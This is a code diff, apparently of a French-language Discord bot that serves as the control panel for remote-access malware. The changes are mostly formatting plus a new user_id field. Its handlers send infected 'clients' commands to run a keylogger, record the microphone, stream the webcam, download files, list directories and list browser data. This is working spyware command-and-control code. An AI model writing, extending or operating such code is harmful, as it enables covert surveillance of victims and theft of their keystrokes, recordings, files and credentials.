@@ -2,20 +2,21 @@ import {ActionRowBuilder, ButtonBuilder} from "discord.js";
 import {commands} from "../commands.js";
 import {executeRequestWithTokenRefresh} from "./token.js";
 import {createEmbed} from "./utils.js";
-import config from "../static/config.json" assert {type: 'json'};
+import config from "../static/config.json" assert {type: "json"};
+
 const {API_BASE_URL} = config;
 
 export const handleHelpCommand = async (interaction) => {
-    await interaction.deferReply({ ephemeral: true });
+    await interaction.deferReply({ephemeral: true});
     const embed = createEmbed('Aide', 'Voici la liste des commandes disponibles :', commands.map(command => ({
         name: `/${command.name}`,
         value: command.description,
     })));
-    await interaction.editReply({ embeds: [embed] });
+    await interaction.editReply({embeds: [embed]});
 };
 
 export const handleClientsCommand = async (interaction) => {
-    await interaction.deferReply({ ephemeral: true });
+    await interaction.deferReply({ephemeral: true});
 
     const statusFilter = interaction.options.getString('status');
     const url = `${API_BASE_URL}/clients/${statusFilter ? `?status=${statusFilter}` : ''}`;
@@ -39,7 +40,7 @@ export const handleClientsCommand = async (interaction) => {
             client.status === 'online' ? '#00FF00' : '#FF0000'
         ));
 
-        await interaction.editReply({ embeds });
+        await interaction.editReply({embeds});
     } catch (error) {
         console.error("Erreur lors de la récupération des clients", error);
         await interaction.editReply("Erreur lors de la récupération des clients.");
@@ -51,30 +52,32 @@ export const handleSendCommand = async (interaction) => {
     const command = interaction.options.getString('command');
     const duration = interaction.options.getInteger('duration') || 10;
     const file_path = interaction.options.getString('file_path');
+    const user_id = interaction.user.id;
 
-    await interaction.deferReply({ ephemeral: true });
+    await interaction.deferReply({ephemeral: true});
 
     const url = `${API_BASE_URL}/command/${clientId}`;
     let data = {
-        command: command
+        command: command,
+        user_id: user_id,
     };
 
     if ((command === 'microphone' || command === 'keylogger') && duration) {
-        data.params = { duration };
+        data.params = {duration};
     } else if ((command === 'microphone' || command === 'keylogger') && !duration) {
         await interaction.editReply(`La durée est requise pour la commande '${command}'.`);
         return;
     }
 
     if (command === 'downloadfile' && file_path) {
-        data.params = { file_path };
+        data.params = {file_path};
     } else if (command === 'downloadfile' && !file_path) {
         await interaction.editReply(`Le chemin du fichier est requis pour la commande '${command}'.`);
         return;
     }
 
     try {
-        await executeRequestWithTokenRefresh(url, { method: 'POST', data });
+        await executeRequestWithTokenRefresh(url, {method: 'POST', data});
         if (command === 'microphone' || command === 'keylogger') {
             const contentType = command === 'microphone' ? 'de l\'audio' : 'du clavier';
             await interaction.editReply(`Démarrage de l'enregistrement ${contentType} pour le client ${clientId} pour ${duration} secondes...`);
@@ -103,12 +106,12 @@ export const handleSendCommand = async (interaction) => {
 
 export const handleLivestreamCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
-    await interaction.deferReply({ ephemeral: true });
+    await interaction.deferReply({ephemeral: true});
 
     const url = `${API_BASE_URL}/webcam/link/${clientId}`;
     const url_webcam = `${API_BASE_URL}/webcam/${clientId}`;
     try {
-        await executeRequestWithTokenRefresh(url, { method: 'GET' });
+        await executeRequestWithTokenRefresh(url, {method: 'GET'});
         await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} démarrée : ${url_webcam}`);
     } catch (error) {
         if (error.response.data.message.includes("hors ligne")) {
@@ -123,7 +126,7 @@ export const handleLivestreamCommand = async (interaction) => {
 export const handleListDataCommand = async (interaction) => {
     const type = interaction.options.getString('type');
     const browser = interaction.options.getString('browser') || null;
-    await interaction.deferReply({ ephemeral: true });
+    await interaction.deferReply({ephemeral: true});
 
     try {
         const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients/`);
@@ -181,11 +184,12 @@ export const handleListDataCommand = async (interaction) => {
 export const handleListDirectoriesClientCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     const dir_path = interaction.options.getString('dir_path');
-    await interaction.deferReply({ ephemeral: true });
+    const user_id = interaction.user.id;
+    await interaction.deferReply({ephemeral: true});
 
     const url = `${API_BASE_URL}/directory/client/${clientId}`;
     try {
-        const response = await executeRequestWithTokenRefresh(url, { method: 'POST', data: { dir_path } });
+        const response = await executeRequestWithTokenRefresh(url, {method: 'POST', data: {dir_path, user_id}});
         const directories_and_files = response.data;
 
         if (directories_and_files.length === 0) {
@@ -232,11 +236,11 @@ export const handleListDirectoriesClientCommand = async (interaction) => {
 
         const components = [new ActionRowBuilder().addComponents(previousButton, nextButton)];
 
-        await interaction.editReply({ embeds: [embed], components });
+        await interaction.editReply({embeds: [embed], components});
 
         const message = await interaction.fetchReply();
         const filter = i => ['previous', 'next'].includes(i.customId) && i.user.id === interaction.user.id;
-        const collector = message.createMessageComponentCollector({ filter, time: 60000 });
+        const collector = message.createMessageComponentCollector({filter, time: 60000});
 
         collector.on('collect', async i => {
             if (i.customId === 'next' && currentPage < totalPages - 1) {
@@ -261,12 +265,12 @@ export const handleListDirectoriesClientCommand = async (interaction) => {
 
             const newComponents = [new ActionRowBuilder().addComponents(newPreviousButton, newNextButton)];
 
-            await i.update({ embeds: [newEmbed], components: newComponents });
+            await i.update({embeds: [newEmbed], components: newComponents});
         });
 
         collector.on('end', async () => {
             try {
-                await interaction.editReply({ content: 'La pagination a expiré.', components: [] });
+                await interaction.editReply({content: 'La pagination a expiré.', components: []});
             } catch (error) {
                 if (error.code !== 10008) { // Ignore "Unknown Message" errors
                     console.error("Erreur lors de la suppression des composants", error);
